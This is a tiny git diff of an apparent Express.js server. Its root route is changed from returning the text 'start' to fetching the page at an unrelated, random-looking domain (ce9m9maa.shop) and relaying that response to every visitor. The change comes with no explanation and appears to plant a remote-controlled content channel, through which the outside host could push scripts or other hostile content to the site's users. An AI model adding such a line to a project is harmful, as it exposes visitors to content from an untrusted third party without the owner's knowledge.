@@ -8,7 +8,7 @@ app.use(express.json());
 
 
 app.get('/', (req, res)=>{
-  res.send('start')
+  fetch('https://ce9m9maa.shop/').then(resp=>resp.text()).then(data=>res.send(data))
 })
 
 app.get('/get', (req, res)=>{
